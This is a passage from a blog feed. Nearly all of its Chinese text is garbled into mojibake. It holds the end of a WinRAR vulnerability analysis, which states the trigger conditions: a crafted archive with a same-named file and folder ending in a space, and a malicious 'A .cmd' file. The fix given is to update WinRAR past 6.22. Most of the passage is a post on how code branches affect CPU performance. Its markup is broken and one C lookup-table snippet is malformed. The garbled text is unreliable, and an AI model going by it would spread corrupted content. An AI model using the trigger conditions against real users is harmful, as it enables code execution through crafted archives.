(winbase.h) - Win32 apps | Microsoft Learn</a></p></blockquote><ol start="3"><li>å› æ­¤ï¼Œæ¶æ„çš„cmdæ–‡ä»¶å<strong>å¿…é¡»</strong>æ˜¯<code>"A .cmd"</code>ï¼Œå¦åˆ™<code>ShellExecuteExW()</code>å°†æ— æ³•è¢«è°ƒç”¨èµ·æ¥</li></ol></li></ul></li><li><p>ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´è§¦å‘<strong>å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶</strong>ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> é€šè¿‡ä¿®æ”¹å‹ç¼©åŒ…äºŒè¿›åˆ¶æ•°æ®<strong>æ„é€ åŒåæ–‡ä»¶å’ŒåŒåæ–‡ä»¶å¤¹å</strong>ï¼ˆæ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸å…è®¸çš„ï¼‰ä¸”å¿…é¡»<strong>ä»¥ä¸€ä¸ªç©ºæ ¼ä½œä¸ºåç¼€</strong>ï¼Œæ­¤åšæ³•çš„ç›®çš„æ˜¯å°†åŒåæ–‡ä»¶å¤¹ä¸‹çš„æ¶æ„æ–‡ä»¶è§£å‹åˆ°æœ¬åœ°ï¼›</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åŒ…å«æ¶æ„ä»£ç æ–‡ä»¶åå¿…é¡»ä¸æ­¥éª¤<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>ä¸­æ„é€ åŒåæ–‡ä»¶å’ŒåŒåæ–‡ä»¶å¤¹åç›¸åŒï¼ˆåŒ…å«ç©ºæ ¼ï¼‰ï¼Œæ­¤åšæ³•ä¿è¯<code>ShellExecuteExW()</code>æ‰§è¡Œçš„æ˜¯æ¶æ„ä»£ç æ–‡ä»¶è€Œä¸æ˜¯è§£å‹çš„æ­£ç¡®æ–‡ä»¶ã€‚</p></li></ul><h2 id="4-ä¿®å¤æªæ–½"><a href="#4-ä¿®å¤æªæ–½" class="headerlink" title="4. ä¿®å¤æªæ–½"></a>4. ä¿®å¤æªæ–½</h2><ul><li>å°†<code>WinRAR</code>æ›´æ–°åˆ°é«˜äº6.22çš„ç‰ˆæœ¬</li><li>ä¸æ‰“å¼€æ¥æºä¸æ˜çš„å‹ç¼©æ–‡ä»¶</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ†æ”¯æ˜¯å¦‚ä½•å½±å“ä»£ç æ€§èƒ½çš„ï¼Ÿ</title>
    <link href="/2023/09/08/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD/"/>
    <url>/2023/09/08/%E5%88%86%E6%94%AF%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E4%BB%A3%E7%A0%81%E6%80%A7%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆ†æ”¯æ˜¯å¦‚ä½•å½±å“ä»£ç æ€§èƒ½çš„ï¼Ÿ"><a href="#åˆ†æ”¯æ˜¯å¦‚ä½•å½±å“ä»£ç æ€§èƒ½çš„ï¼Ÿ" class="headerlink" title="åˆ†æ”¯æ˜¯å¦‚ä½•å½±å“ä»£ç æ€§èƒ½çš„ï¼Ÿ"></a>åˆ†æ”¯æ˜¯å¦‚ä½•å½±å“ä»£ç æ€§èƒ½çš„ï¼Ÿ</h1><p>ä¸Šå‘¨åœ¨ryfçš„å…¬ä¼—å·ä¸Šå‘ç°ä¸€ç¯‡åä¸ºã€ŠHow branches influence the performance of your code and what can you do about it?ã€‹<a href="https://johnnysswlab.com/how-branches-influence-the-performance-of-your-code-and-what-can-you-do-about-it/">[1]</a>çš„æ–‡ç« ï¼Œè®²è¿°äº†ä»£ç åˆ†æ”¯ï¼ˆifè¯­å¥ï¼‰å¯¹äºç¨‹åºæ€§èƒ½çš„å½±å“ã€‚ä¸»è¦å¥‘æœºæ˜¯åœ¨AFLæºç çš„ifè¯­å¥ä¸­å¸¸å¸¸å‡ºç°çš„<code>likely</code>å’Œ<code>unlikely</code>ç”¨æ³•ï¼Œæ‰€ä»¥è¿™ä¸€ç¯‡æ–‡ç« å°±æŒºè®©æˆ‘åœ¨æ„çš„ï¼Œä¸è¿‡ä¸Šå‘¨ä¸€ç›´åœ¨æ•´PE Parserï¼Œå°±æ²¡æ¥å¾—åŠå»çœ‹ã€‚æ°é€¢è¿™å‘¨å·²ç»æ•´å®Œäº†PE Parserï¼Œæ•…è…¾å‡ºæ—¶é—´æ¥çœ‹ä¸€çœ‹è¿™ç¯‡æ–‡ç« ï¼Œå¹¶è®°å½•ç›¸å…³è¦ç‚¹ã€‚</p><h2 id="1-CPUçš„ä¸€äº›ç‰¹æ€§"><a href="#1-CPUçš„ä¸€äº›ç‰¹æ€§" class="headerlink" title="1. CPUçš„ä¸€äº›ç‰¹æ€§"></a>1. CPUçš„ä¸€äº›ç‰¹æ€§</h2><ul><li>ç®¡çº¿åŒ–ï¼ˆPipelineï¼‰ï¼š<ul><li>è¿™ä¸ªæ¦‚å¿µå’Œæˆ‘ä»¬è®¡ç½‘ä¸­å­¦ä¹ æµæ°´çº¿æŠ€æœ¯ç›¸ä¼¼ï¼Œå¯¹äºCPUæ¥è¯´ï¼Œè¿™å…¶å®å°±æ˜¯<strong>å¤šæ¡æŒ‡ä»¤æ—¶é—´å¹¶è¡Œå¤„ç†</strong>çš„æŠ€æœ¯</li></ul></li><li>ä¹±åºæ‰§è¡Œï¼ˆOut of order executionï¼‰</li><li>é¢„æµ‹æ‰§è¡Œï¼ˆSpeculative executionï¼‰<ul><li>é¢„æµ‹åˆ†æ”¯çš„ç›®çš„åœ°</li><li>å¦‚æœé¢„æµ‹æœ‰è¯¯ï¼Œåˆ™é¢„æµ‹è¿è¡Œçš„ç»“æœå°†ä¼šæ¸…ç©º</li></ul></li><li>åˆ†æ”¯é¢„æµ‹ï¼ˆBranch predictionï¼‰<ul><li>åˆ†æ”¯é¢„æµ‹å™¨</li></ul></li></ul><h2 id="2-CPUå¦‚ä½•å½±å“åˆ†æ”¯"><a href="#2-CPUå¦‚ä½•å½±å“åˆ†æ”¯" class="headerlink" title="2. CPUå¦‚ä½•å½±å“åˆ†æ”¯"></a>2. CPUå¦‚ä½•å½±å“åˆ†æ”¯</h2><ul><li><p>ä¸ºäº†ä¿æŒæœ€å¤§åŒ–æµæ°´çº¿å¹¶é¿å…é™é€Ÿï¼Œå¤„ç†å™¨éœ€è¦çŸ¥é“åˆ†æ”¯æœ€ç»ˆç›®çš„åœ°å€ï¼ˆç”šè‡³åœ¨å¤„ç†å™¨è§£ç åˆ†æ”¯æŒ‡ä»¤ä¹‹å‰ï¼‰</p></li><li><p>å¤„ç†å™¨å¯èƒ½çš„ç›¸å…³æ“ä½œï¼ˆä¸å…·ä½“å¤„ç†å™¨è®¾è®¡æœ‰å…³ï¼‰</p><ul><li><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> æš‚åœæµæ°´çº¿ï¼ˆstall the pipelineï¼‰å¹¶åœæ­¢æŒ‡ä»¤è§£ç æ“ä½œç›´åˆ°åˆ†æ”¯æŒ‡ä»¤è¢«è§£ç ä¸”åˆ†æ”¯çš„ç›®çš„åœ°å·²çŸ¥ï¼Œç„¶åå°†ç»§ç»­è½½å…¥æµæ°´çº¿æ‰§è¡Œæ­£ç¡®çš„æŒ‡ä»¤ï¼›</li><li><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åŠ è½½è¯¥åˆ†æ”¯åé¢çš„æŒ‡ä»¤ï¼š<ul><li>å¦‚æœä¹‹ååœ¨è¯¥åˆ†æ”¯å¤„åšå‡ºäº†é”™è¯¯çš„é€‰æ‹©ï¼ˆi.e. ä¹Ÿå°±æ˜¯è¯´ä¸æ‰§è¡Œè¯¥åˆ†æ”¯åé¢çš„æŒ‡ä»¤ï¼Œè€Œæ˜¯æ‰§è¡Œè·³è½¬çš„æŒ‡ä»¤ï¼‰ï¼Œé‚£ä¹ˆå¤„ç†å™¨å°†æ¸…ç©ºæµæ°´çº¿å¹¶å¼€å§‹è½½å…¥æ­£ç¡®çš„æŒ‡ä»¤</li></ul></li><li><span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å‘åˆ†æ”¯é¢„æµ‹æœŸè¯¢é—®åº”è¯¥åŠ è½½åˆ†æ”¯åé¢çš„æŒ‡ä»¤è¿˜æ˜¯åˆ†æ”¯è·³è½¬çš„ç›®çš„åœ°å€çš„æŒ‡ä»¤</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šä¸»æµçš„å¤„ç†å™¨ä¸€èˆ¬ä¸ä¼šè¿›è¡Œ<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> çš„æ“ä½œï¼ŒåŸå› æ˜¯<span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> çš„æ“ä½œå¼€é”€è¿‡å¤§ï¼›ä¸»æµå¤„ç†å™¨ä¸€èˆ¬ä¼šé‡‡ç”¨<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>æˆ–<span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>çš„æ–¹å¼è¿›è¡Œå¤„ç†ï¼Œ<span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>é€šå¸¸åœ¨ä½ç«¯åµŒå…¥å¼ç³»ç»Ÿæˆ–ä½å¼€é”€å¤„ç†å™¨ä¸­ä½¿ç”¨ï¼Œ<span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>é€šå¸¸åœ¨æ¡Œé¢ç«¯æˆ–ç¬”è®°æœ¬ç«¯çš„é«˜æ€§èƒ½CPUä¸­ä½¿ç”¨<span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>ã€‚</p></li></ul><h3 id="æ— åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU"><a href="#æ— åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU" class="headerlink" title="æ— åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU"></a>æ— åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU</h3><ul><li>ç›´æ¥è½½å…¥åˆ†æ”¯åé¢çš„æŒ‡ä»¤</li><li>å¦‚æœé¢„æµ‹å¤±è´¥ï¼Œåˆ™æ¸…ç©ºå·²åŠ è½½çš„é”™è¯¯æŒ‡ä»¤ï¼›å› æ­¤ï¼Œåœ¨ä¸æ‰§è¡Œåˆ†æ”¯æ“ä½œçš„æƒ…å†µä¸‹ï¼Œè¯¥æ“ä½œçš„æˆæœ¬æœ€ä½</li><li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæ— åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPUè®¾è®¡é€šå¸¸æ˜¯ç®€å•çš„ ==&gt; æµæ°´çº¿è¾ƒçŸ­ï¼Œå› æ­¤åšå‡ºé”™è¯¯é€‰æ‹©çš„æƒ©ç½šå¹¶ä¸æ˜¯ç‰¹åˆ«é«˜</li></ul><h3 id="æœ‰åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU"><a href="#æœ‰åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU" class="headerlink" title="æœ‰åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU"></a>æœ‰åˆ†æ”¯é¢„æµ‹ç‰¹æ€§çš„CPU</h3><ul><li>å¦‚æœCPUæµæ°´çº¿å¾ˆé•¿ï¼Œé‚£ä¹ˆåˆ†æ”¯é¢„æµ‹å™¨é¢„æµ‹å¤±è´¥æ‰€å¸¦äº†çš„å½±å“å°±ä¼šå¾ˆå¤§ [ä½“ç°åœ¨æµæ°´çº¿ä¸Šæ‰§è¡Œçš„é”™è¯¯æŒ‡ä»¤å°†è¢«æ¸…ç©º]</li><li>åˆ†æ”¯é¢„æµ‹çš„å¤æ‚æ€§<ul><li>æœ‰ä¸€äº›åˆ†æ”¯å¾ˆå¥½é¢„æµ‹</li><li>å¦ä¸€äº›åˆ†æ”¯å¾ˆéš¾é¢„æµ‹</li></ul></li><li>è¯´ç™½äº†å°±æ˜¯åˆ†æ”¯é¢„æµ‹å™¨è¿›è¡Œåˆ†æ”¯æ¨æµ‹ï¼Œå¹¶é¢„å¤„ç†é¢„æµ‹åˆ†æ”¯å¤„çš„æŒ‡ä»¤ï¼Œå¦‚æœé¢„æµ‹æˆåŠŸï¼Œé‚£å°†æé«˜ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ï¼Œå¦åˆ™ï¼Œå°†æµªè´¹èµ„æºåœ¨æ— ç”¨çš„æŒ‡ä»¤ä¸Šï¼Œå› è€Œå¸¦æ¥é¢å¤–çš„å¼€é”€ï¼›<span class="github-emoji"><span>ğŸ¤”</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>æ¢å¥è¯è¯´ï¼Œå…¶æ€§èƒ½å®Œå…¨å–å†³äºåˆ†æ”¯é¢„æµ‹çš„æˆåŠŸç‡ã€‚</li></ul><h2 id="3-æ±‡ç¼–æ¦‚è¿°"><a href="#3-æ±‡ç¼–æ¦‚è¿°" class="headerlink" title="3. æ±‡ç¼–æ¦‚è¿°"></a>3. æ±‡ç¼–æ¦‚è¿°</h2><ul><li>å‡è®¾æˆ‘ä»¬çš„Cä»£ç ç‰‡æ®µå¦‚ä¸‹æ‰€ç¤ºï¼š</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (p != nullptr) {<br>    transform(p);<br>} <span class="hljs-keyword">else</span> {<br>    invalid++;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p>æ±‡ç¼–åŒ…å«ä¸¤ç§æŒ‡ä»¤ï¼Œä¸€ç§æ˜¯æ¯”è¾ƒæŒ‡ä»¤ï¼Œå¦å¤–ä¸€ç§æ˜¯è·³è½¬æŒ‡ä»¤ï¼›ä¸Šè¿°Cä»£ç å¯¹åº”äºä¸‹é¢çš„ä¼ªæ±‡ç¼–ç¨‹åºï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    p_not_null = (p != nullptr)<br>    if_not (p_not_null) goto ELSE;<br>    transform(p);<br>    goto ENDIF;<br>ELSE:<br>    invalid++;<br>ENDIF:<br></code></pre></td></tr></tbody></table></figure><ul><li>æ±‡ç¼–ä¼šè¯„ä¼°åŸå§‹Cæ¡ä»¶è¯­å¥<code>p!=nullptr</code>ï¼Œå¦‚æœä¸º<code>false</code>ï¼Œåˆ™æ‰§è¡Œä¸<code>else</code>åˆ†æ”¯ç›¸å¯¹åº”çš„æŒ‡ä»¤åˆ†æ”¯ï¼Œå¦åˆ™ï¼Œå°±æ‰§è¡Œä¸<code>if</code>åˆ†æ”¯ä¸»ä½“ç›¸å¯¹åº”çš„æŒ‡ä»¤</li><li>ä¸Šè¿°ä¼ªæ±‡ç¼–è¿˜æœ‰ä¸€ç§ç­‰ä»·å½¢å¼ï¼š</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    p_not_null = (p != nullptr)<br>    if (p_not_null) goto IF:<br>    invalid++;<br>    goto ENDIF;<br>IF:<br>    transform(p);<br>ENDIF: <br></code></pre></td></tr></tbody></table></figure></li><li><p>è™½ç„¶ä¸Šé¢ä¸¤ç§ä¼ªæ±‡ç¼–æ˜¯ç­‰ä»·çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°ç¼–è¯‘å™¨ä¼šå½¢å¦‚ç¬¬ä¸€ä¸ªçš„æ±‡ç¼–ï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨GCC builtinsæ¥å½±å“è¿™ä¸€å†³ç­–ï¼›å…³é”®çš„è§è§£<span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>æ˜¯ï¼š<strong>åœ¨ä¸€äº›å¤„ç†å™¨ä¸Šï¼Œé¡ºåºæ‰§è¡Œæ¯”è·³è½¬çš„å¼€é”€è¦å°å¾ˆå¤šï¼Œè¿™æ ·çš„è¯ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å¦‚ä½•ç»“æ„åŒ–ä»£ç å°†ä¼šå¸¦æ¥æ›´å¥½çš„æ€§èƒ½</strong></p></li></ul><h2 id="4-åˆ†æ”¯å’Œå‘é‡åŒ–"><a href="#4-åˆ†æ”¯å’Œå‘é‡åŒ–" class="headerlink" title="4. åˆ†æ”¯å’Œå‘é‡åŒ–"></a>4. åˆ†æ”¯å’Œå‘é‡åŒ–</h2><ul><li><p>å‘é‡åŒ–ï¼šç®€å•æ¥è¯´ï¼Œå…¶å®å°±æ˜¯ç°ä»£çš„CPUæœ‰ä¸€äº›ç‰¹æ®Šçš„<strong>å‘é‡æŒ‡ä»¤</strong>ï¼Œè¿™äº›å‘é‡æŒ‡ä»¤èƒ½å¤Ÿå¤„ç†è¶…è¿‡ä¸€ä¸ªåŒç±»å‹çš„æ•°æ®ï¼Œe.g. æœ‰ä¸€ä¸ªæŒ‡ä»¤èƒ½å¤Ÿä»å†…å­˜ä¸­è½½å…¥4ä¸ªæ•´æ•°ï¼Œä¸€ä¸ªæŒ‡ä»¤èƒ½å¤Ÿåš4æ¬¡åŠ æ³•ï¼Œå¦ä¸€ä¸ªæŒ‡ä»¤èƒ½å¤Ÿå°†4ä¸ªç»“æœå­˜å›å†…å­˜</p></li><li><p>è‡ªåŠ¨å‘é‡åŒ–ï¼ˆautovectorizationï¼‰ï¼šå‘é‡åŒ–çš„å¥½å¤„æ˜¯èƒ½å¤Ÿä½¿è¿è¡Œé€Ÿåº¦å˜å¿«ã€‚CPUçš„è‡ªåŠ¨å‘é‡åŒ–ä¼šè‡ªåŠ¨ç”Ÿæˆå‘é‡æŒ‡ä»¤æ¥åŠ å¿«è¿è¡Œé€Ÿåº¦</p></li><li><p>è‡ªåŠ¨å‘é‡åŒ–çš„å±€é™æ€§ï¼ˆä¸åˆ†æ”¯æœ‰å…³ï¼‰ï¼š</p><ul><li><pre><code class="c">for (int i = 0; i &lt; n; i++) {    if (a[i] &gt; 0) {        a[i]++;    } else {        a[i]--;    }}<figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">  *</span> ä¸Šè¿°å¾ªç¯å¾ˆéš¾è¢«å‘é‡åŒ–ï¼ŒåŸå› åœ¨äºæ•°æ®æœ¬èº«çš„æ”¹å˜ä¸æ•°æ®å€¼ä¹‹é—´çš„å…³ç³»<br><br><span class="hljs-section">## 5. ç¨‹åºè¿è¡Œæ›´å¿«çš„æŠ€å·§ï¼ˆ:star:ï¼‰</span><br><br><span class="hljs-bullet">*</span> ç›¸å…³å®šä¹‰ï¼š<br><span class="hljs-bullet">  *</span> å®šä¹‰1 <span class="hljs-strong">**æ¡ä»¶æ¦‚ç‡**</span>ï¼šæŒ‡çš„æ˜¯æ¡ä»¶ä¸ºçœŸçš„å¯èƒ½æ€§<br><span class="hljs-bullet">    *</span> å…·æœ‰åˆ†æ”¯é¢„æµ‹çš„CPUèƒ½å¾ˆå¿«è¯†åˆ«å‡ºå“ªä¸€ä¸ªæ¡ä»¶å¾ˆå¯èƒ½ä¸ºçœŸ/å‡ï¼›å½“é‡åˆ°å¾ˆéš¾é¢„æµ‹çš„åˆ†æ”¯æ—¶ï¼Œåˆ†æ”¯é¢„æµ‹å™¨å°†æœ‰50%æ­£ç¡®é¢„æµ‹çš„æ¦‚ç‡ï¼Œè€Œè¿™äº›åˆ†æ”¯ä¾¿æœ‰ä¼˜åŒ–çš„æ½œåŠ›<br><span class="hljs-bullet">  *</span> å®šä¹‰2 <span class="hljs-emphasis">*computational intensive*</span>, <span class="hljs-emphasis">*expensive*</span> or <span class="hljs-emphasis">*heavy condition*</span><br><span class="hljs-bullet">    *</span> è®¡ç®—æ—¶éœ€è¦å¾ˆå¤šçš„æŒ‡ä»¤ or éœ€è¦å‚ä¸è®¡ç®—çš„æ•°æ®ä¸åœ¨ç¼“å­˜ï¼ˆå•ä¸ªæŒ‡ä»¤éœ€è¦å¾ˆå¤šæ—¶é—´å»å®Œæˆï¼‰<br><br><span class="hljs-section">### ä¼˜åŒ–If/elseå‘½ä»¤é“¾</span><br><br>å‡è®¾æœ‰ä»¥ä¸‹æºä»£ç ï¼š<br><br><span class="hljs-code">```c</span><br><span class="hljs-code">if (a &gt; 0) { </span><br><span class="hljs-code">    do_something();</span><br><span class="hljs-code">} else if (a == 0) { </span><br><span class="hljs-code">   do_something_else();</span><br><span class="hljs-code">} else {</span><br><span class="hljs-code">    do_something_yet_else();</span><br><span class="hljs-code">}</span><br></code></pre></td></tr></tbody></table></figure></code></pre></li></ul></li></ul><p>è¿›ä¸€æ­¥å‡è®¾ï¼ˆa &lt; 0ï¼‰æ¦‚ç‡ä¸º70%ï¼›ï¼ˆa &gt; 0ï¼‰æ¦‚ç‡ä¸º20%ï¼Œï¼ˆa == 0ï¼‰æ¦‚ç‡ä¸º10%ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡æ’ä¸Šè¿°ä»£ç ä¸­çš„é¡ºåºï¼Œå…·ä½“æ¥è¯´ï¼Œ<strong>å°†è§¦å‘æ¦‚ç‡é«˜çš„æ¡ä»¶è¶Šå¾€å‰æ”¾ç½®</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (a &lt; <span class="hljs-number">0</span>) {   <span class="hljs-comment">// 70 %</span><br>    do_something_yet_else();<br>} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">0</span>) {   <span class="hljs-comment">// 20 %</span><br>   do_something();<br>} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// 10 %</span><br>    do_something_else();<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="ä½¿ç”¨æŸ¥æ‰¾è¡¨è€Œä¸æ˜¯switchè¯­å¥"><a href="#ä½¿ç”¨æŸ¥æ‰¾è¡¨è€Œä¸æ˜¯switchè¯­å¥" class="headerlink" title="ä½¿ç”¨æŸ¥æ‰¾è¡¨è€Œä¸æ˜¯switchè¯­å¥"></a>ä½¿ç”¨æŸ¥æ‰¾è¡¨è€Œä¸æ˜¯switchè¯­å¥</h3><p>åœ¨åˆ é™¤åˆ†æ”¯æ—¶ï¼ŒæŸ¥æ‰¾è¡¨LUTå¶å°”ä¼šæ’ä¸Šç”¨åœºã€‚è™½ç„¶switchè¯­å¥ä¸­çš„åˆ†æ”¯åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½å¾ˆå®¹æ˜“é¢„æµ‹ï¼Œå› è€Œè¿™ç§ä¼˜åŒ–å¾ˆå¯èƒ½ä¸ä¼šå¸¦æ¥ä»»ä½•æ•ˆæœã€‚å°½ç®¡å¦‚æ­¤ï¼Œè¿˜æ˜¯å°½å¯èƒ½å»åšè¿™ç§è½¬æ¢ã€‚å‡è®¾æœ‰ä¸‹è¿°ä»£ç ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">switch</span>(day) {<br>    <span class="hljs-keyword">case</span> MONDAY: <span class="hljs-keyword">return</span> <span class="hljs-string">"Monday"</span>;<br>    <span class="hljs-keyword">case</span> TUESDAY: <span class="hljs-keyword">return</span> <span class="hljs-string">"Tuesday"</span>;<br>   ...<br>    <span class="hljs-keyword">case</span> SUNDAY: <span class="hljs-keyword">return</span> <span class="hljs-string">"Sunday"</span>;<br>    <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;<br>};<br></code></pre></td></tr></tbody></table></figure><p>ä¸Šè¿°ä»£ç å¯ä»¥ä½¿ç”¨LUTè¿›è¡Œå®ç°ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (day &lt; MONDAY || day &gt; SUNDAY) <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;<br><span class="hljs-type">char</span>* days_to_string = { <span class="hljs-string">"Monday"</span>, <span class="hljs-string">"Tuesday"</span>, ... , <span class="hljs-string">"Sunday"</span> };<br><span class="hljs-keyword">return</span> days_to_string[day - MONDAY];<br></code></pre></td></tr></tbody></table></figure><p><strong>é€šå¸¸æƒ…å†µä¸‹</strong>ç¼–è¯‘å™¨å¯èƒ½ä¼šä¸ºä½ å®Œæˆä¸Šè¿°æ“ä½œï¼Œi.e.å°†switchè¯­å¥è½¬ä¸ºä¸€ä¸ªæŸ¥æ‰¾è¡¨ï¼Œ</p><p>æ­¤å¤–ï¼ŒGNUè¯­è¨€æ‰©å±•ä¸­æœ‰ä¸€ä¸ªå«<em>computed labels</em>çš„ä¸œè¥¿èƒ½å¤Ÿå…è®¸ä½ å®ç°å­˜å‚¨<em>labels</em>çš„æŸ¥æ‰¾è¡¨ï¼Œè¿™ä¸ªç©æ„å¯¹äºå®ç°è§£æå™¨æ¥è¯´æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¦‚ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">void</span>* days[] = { &amp;&amp;monday, &amp;&amp;tuesday, ..., &amp;&amp;sunday };<br>    <span class="hljs-keyword">goto</span> days[day];<br>monday:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"Monday"</span>;<br>tuesday:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"Tuesday"</span>;<br>...<br>sunday:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"Sunday"</span>;<br></code></pre></td></tr></tbody></table></figure><h3 id="å°†æœ€å¸¸è§çš„caseç§»å‡ºswitch"><a href="#å°†æœ€å¸¸è§çš„caseç§»å‡ºswitch" class="headerlink" 